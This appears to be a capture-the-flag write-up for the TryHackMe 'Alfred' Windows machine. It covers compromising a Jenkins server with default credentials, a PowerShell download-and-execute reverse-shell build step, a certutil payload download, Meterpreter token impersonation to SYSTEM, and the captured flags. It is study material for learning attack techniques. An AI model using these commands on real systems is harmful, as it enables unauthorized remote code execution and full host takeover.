# Alfred — THM Writeup

A Windows machine themed around Batman/Jenkins. Exploit a default-credential Jenkins instance to gain an initial shell as `bruce`, then escalate to `NT AUTHORITY\SYSTEM` via token impersonation (Incognito).

**Flag:** `root{dff0f748678f280250f25a45b8046b4a}` _(see note on format below)_

---
## Room Description

> Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.
> 
> Jenkins is a widely used automation/CI-CD server. After exploiting a misconfiguration in it, we use token impersonation to get full SYSTEM access.
> 
> Since this is a Windows target, [Nishang](https://github.com/samratashok/nishang)'s [`Invoke-PowerShellTcp.ps1`](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell script is used for initial access.
> 
> Note: the machine does not respond to ICMP (ping) and may take a few minutes to boot.

**Target:** `10.49.189.16`

---
## Enumeration

### Nmap
```bash
nmap -Pn 10.49.189.16 -p-
```

```
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

`-Pn` was required since the host doesn't respond to ICMP. Three services of interest: a web server, RDP, and an HTTP proxy (Jenkins, as it turns out).
### Port 80

```html
<html>
<body><center>
<img src="bruce.jpg"><br/>
RIP Bruce Wayne<br/>
Donations to <strong>alfred@wayneenterprises.com</strong> are greatly appreciated.
</center></body>
</html>
```

- A static memorial page — nothing exploitable here, but it confirms the Batman/Wayne Enterprises theme and gives us a likely username pattern (`bruce`).
### Port 8080 — Jenkins
Identified as **Jenkins 2.190**, using **default credentials**:
```
Username: admin
Password: admin
```

---
## Initial Access — Jenkins RCE via Build Step

Jenkins allows authenticated users to configure build steps that execute arbitrary commands on the underlying OS — a well-known RCE vector once you have any kind of write/config access to a project.

**Steps:**

1. Log into Jenkins at `http://10.49.189.16:8080` with `admin:admin`.
2. Create/open a Project → **Configure**.
3. Under **Build Environment** / **Build Steps**, add an **Execute Windows batch command** (or "Execute shell" equivalent) step.
4. Host the Nishang reverse shell script and a listener on the attacking machine:

```bash
python3 -m http.server 8000
```
- Listener
```bash
nc -lvnp 4444
```

5. Set the Jenkins build step to download and execute the reverse shell:
```powershell
powershell -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('http://@gh0ulH4x:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress @gh0ulH4x -Port 4444"
```
6. Save and trigger a build ("Build Now").
- **Result — shell caught on the listener:**
```
listening on [any] 4444 ...
connect to [@gh0ulH4x] from (UNKNOWN) [10.49.176.88] 49235
Windows PowerShell running as user bruce on ALFRED
```
- Jenkins' build service account runs as the local user `bruce` on this box.

---
## User Flag
- User `Pwn3d!!`
```powershell
PS C:\Program Files (x86)\Jenkins\workspace\project> cd C:\Users
PS C:\Users> dir
d----   bruce
d----   DefaultAppPool
d-r--   Public

PS C:\Users> cd bruce\Desktop
PS C:\Users\bruce\Desktop> dir
-a---   user.txt

PS C:\Users\bruce\Desktop> more user.txt
79007a09481963edf2e1321abd9ae2a0
```

**User flag:** `79007a09481963edf2e1321abd9ae2a0`

---
## Privilege Escalation — Token Impersonation (Incognito / Potato-family)

### Checking privileges

```powershell
PS C:\Users\bruce\Desktop> whoami /all
```

- Key line in the privileges table:
```
Privilege Name            Description                               State
=========================  ========================================= ========
SeImpersonatePrivilege    Impersonate a client after authentication Enabled
```
- `bruce` holds **`SeImpersonatePrivilege`** — a classic Windows privesc primitive. A process/service account with this right enabled (common for IIS app pool identities and Jenkins service accounts) can impersonate other authenticated tokens on the box, including SYSTEM's, via "Potato"-family exploits (RottenPotato, JuicyPotato, PrintSpoofer, etc.) or Metasploit's `incognito` extension.
### Getting a Meterpreter session

- The raw reverse shell from Nishang doesn't support `incognito` directly, so a Meterpreter payload was staged and executed via the existing shell:

```powershell
# msfvenom used to generate a Windows Meterpreter .exe payload, served from the attacker's http.server

certutil.exe -urlcache -split -f http://@gh0ulH4x:8000/shell-name.exe
.\shell-name.exe
```
- Caught with `multi/handler`:
```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on @gh0ulH4x:5555
[*] Meterpreter session opened
```
### Exploiting `SeImpersonatePrivilege` with Incognito

```
meterpreter > load incognito
Loading extension incognito ... Success.

meterpreter > list_tokens -u
Delegation Tokens Available
  ALFRED\bruce
  NT AUTHORITY\SYSTEM

meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

- A SYSTEM delegation token was already sitting available on the box (a side effect of the way Windows caches logon tokens for privileged services like Jenkins' service account) — `incognito` simply let `bruce` impersonate it directly, no further exploit binary needed.

### Stabilizing the session
- To avoid losing SYSTEM if the impersonated process dies, migrated into a stable, long-running SYSTEM-owned process:
```
meterpreter > pgrep services.exe
668

meterpreter > migrate 668
[*] Migrating from <pid> to 668...
[*] Migration completed successfully.

meterpreter > sysinfo
Computer        : ALFRED
OS              : Windows 7 (6.1 Build 7601, SP1)
Architecture    : x64
Domain          : WORKGROUP
Meterpreter     : x64/windows
```

---
## Root Flag

```
meterpreter > cat C:/Windows/System32/config/root.txt
dff0f748678f280250f25a45b8046b4a
```

**Root flag:** `dff0f748678f280250f25a45b8046b4a`

_(Placed at an unusual path for a flag — inside `System32\config\`, normally reserved for registry hive files — likely planted there deliberately since it requires full SYSTEM read access to reach.)_

---
## Flag Summary

|Flag|Value|
|---|---|
|User flag|`79007a09481963edf2e1321abd9ae2a0`|
|Root flag|`dff0f748678f280250f25a45b8046b4a`|

---

## Techniques Used

- **Default credential exploitation** — Jenkins `admin:admin` left unchanged from install.
- **Jenkins build-step RCE** — abusing the "Execute Windows batch command" build step to run arbitrary PowerShell on the host as the Jenkins service account.
- **Nishang reverse shell** — `Invoke-PowerShellTcp.ps1`, downloaded and executed in-memory via `IEX` (no file dropped to disk, useful for AV evasion).
- **`certutil.exe -urlcache`** — abusing a legitimate Windows binary (LOLBin) to download a payload, bypassing the need for `wget`/`curl` on Windows.
- **`SeImpersonatePrivilege` abuse / Incognito** — a service account holding this privilege had an NT AUTHORITY\SYSTEM delegation token available to impersonate directly, escalating from a standard user context to full SYSTEM without needing a dedicated Potato-exploit binary.
- **Meterpreter `migrate`** — moving into a stable SYSTEM-owned process (`services.exe`) to keep the elevated session alive.